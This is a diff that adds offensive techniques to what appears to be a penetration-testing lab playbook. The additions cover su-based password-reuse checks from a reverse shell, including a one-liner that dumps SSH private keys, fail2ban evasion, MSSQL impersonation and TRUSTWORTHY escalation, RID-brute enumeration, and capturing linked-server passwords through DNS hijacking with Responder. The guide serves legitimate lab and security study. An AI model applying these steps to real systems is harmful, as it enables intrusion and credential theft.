@@ -93,6 +93,26 @@ first line of the key body: after the `openssh-key-v1\0` magic come the cipher a
 KDF names, and `none`/`none` means the key is unencrypted. One command instead of
 a wordlist — and it stops you attributing a *permissions* win to a cracking win.
 
+**An sshd refusal does not rule out password reuse — `su` tests the real Unix
+password even when sshd won't.** A recovered web/app password that sshd rejects
+(pubkey-only, `AllowUsers`, `Match` jail, or the account simply not permitted)
+can still be the account's local password: `su - <user>` goes through PAM against
+`/etc/shadow`, a different gate. Don't conclude reuse is dead from an SSH refusal.
+From a non-TTY web/reverse shell, drive it with a tiny PTY harness that answers
+the prompt and writes output somewhere you can read it back:
+
+```bash
+python3 -c 'import pty,sys; pty.spawn(["su","-",sys.argv[1],"-c","id;cat ~/.ssh/id_* 2>/dev/null"])' <user>
+```
+
+**Polling SSH before the key is planted trips fail2ban and bans your *source IP
+for every account* — and kills any tunnel on that IP.** The symptom is
+`kex_exchange_identification: Connection reset`. So confirm a foothold succeeded by
+polling a **world-readable oracle the payload writes** (a `/tmp` file, an HTTP
+endpoint) — never by repeatedly SSHing to the target account — and only SSH once
+the key is known planted. If you do get banned, reconnect the VPN for a fresh
+source IP.
+
 **Read `sshd_config` and its drop-ins as an attack surface, not as trivia.**
 `/etc/ssh/sshd_config.d/*.conf` is where labs put the interesting deviation:
 
@@ -243,6 +263,64 @@ default. The result is a NetNTLMv2 for the service account — crack it offline
 (`john --format=netntlmv2`), it cannot be relayed to a DC with signing
 required. If the listener prints nothing, do not assume failure: see
 `foothold.md` on reading the hash off the wire.
+
+**A low-privilege MSSQL login is usually one grant away from more — enumerate the
+impersonation/ownership graph before concluding you're stuck.**
+
+```sql
+-- who can you become?
+SELECT pr.name grantee, pr2.name grantor FROM sys.server_permissions pe
+  JOIN sys.server_principals pr  ON pe.grantee_principal_id=pr.principal_id
+  JOIN sys.server_principals pr2 ON pe.grantor_principal_id=pr2.principal_id
+  WHERE pe.permission_name='IMPERSONATE';
+EXECUTE AS LOGIN='<other>';   -- become it; REVERT to step back
+```
+
+Escalation classes, cheapest first:
+- **IMPERSONATE chain** — a login you can become may itself impersonate another,
+  or be `sysadmin`; `EXECUTE AS LOGIN='sa'` the moment any hop is sysadmin.
+- **TRUSTWORTHY + db_owner** — if you are (or can impersonate) db_owner of a
+  TRUSTWORTHY database owned by a sysadmin (`msdb` is TRUSTWORTHY by default),
+  a proc `WITH EXECUTE AS OWNER` that runs `sp_addsrvrolemember` grants sysadmin.
+  Check `is_trustworthy_on` per DB and `IS_MEMBER('db_owner')` in each.
+- **Non-sysadmin xp_cmdshell is a decoy trap.** A login with only *EXECUTE* on
+  `xp_cmdshell` (not sysadmin) runs under the `##xp_cmdshell_proxy_account##`
+  credential. `EXECUTE permission denied` = no grant; `LogonUserW ... 1326` = the
+  grant exists but the proxy password is stale — unfixable without sysadmin, so
+  don't tunnel on it, escalate by another class instead.
+
+**When SMB/LDAP are firewalled, MSSQL is your domain-enumeration oracle** — even a
+`guest` login resolves directory principals with no AD port open:
+- `nxc mssql $T -u <u> -p <p> --local-auth --rid-brute` cycles the domain RID
+  space through the SQL connection → full user list.
+- `SELECT SUSER_SID('<DOM>\<name>')` is non-NULL only for principals that exist →
+  a credential-free username-existence oracle that also distinguishes a real
+  domain account from a local SQL login (the latter resolves NULL).
+
+**A linked server is a stored credential — capture the login by hijacking the
+name it dials.** Enumerate them from any MSSQL foothold (`enum_links`, or
+`SELECT * FROM sys.servers`), then check how each one authenticates and whether
+its target actually resolves:
+
+```bash
+pwnloop x "impacket-mssqlclient user:pass@$T -port <p> -windows-auth <<< 'enum_links'"
+# for a link SQLNN: does its datasource resolve? nslookup <link>.<domain> <dc>
+```
+
+Two distinct wins depending on the auth mode:
+- **SQL authentication** — the remote login is a username+password the local
+  instance replays outbound. If you can make that name point at *you* (an AD zone
+  where any authenticated user can `add dnsRecord`, or a hosts/WINS gap), stand up
+  a rogue MSSQL listener — Responder's `SQL = On` handler does it — and trigger
+  the link (`EXEC ('SELECT 1') AT [LINK]`). The captured password is **cleartext**
+  in Responder's `MSSQL-Cleartext-*` log, not a hash to crack.
+- **Windows/self-mapping (`RPC OUT`)** — `EXEC (...) AT [LINK]` runs SQL on the
+  far side as *its* context; chain to `xp_cmdshell` if the remote login is
+  privileged. A link that self-maps to a sysadmin is lateral RCE.
+
+The class here: *a service that dials a name you can define is a credential/relay
+primitive.* A linked server pointed at an NXDOMAIN host is the tell — the box
+wants you to create the record. (See the AD DNS write note in `ad.md`/`local.md`.)
 
 ## Redis (6379)
 
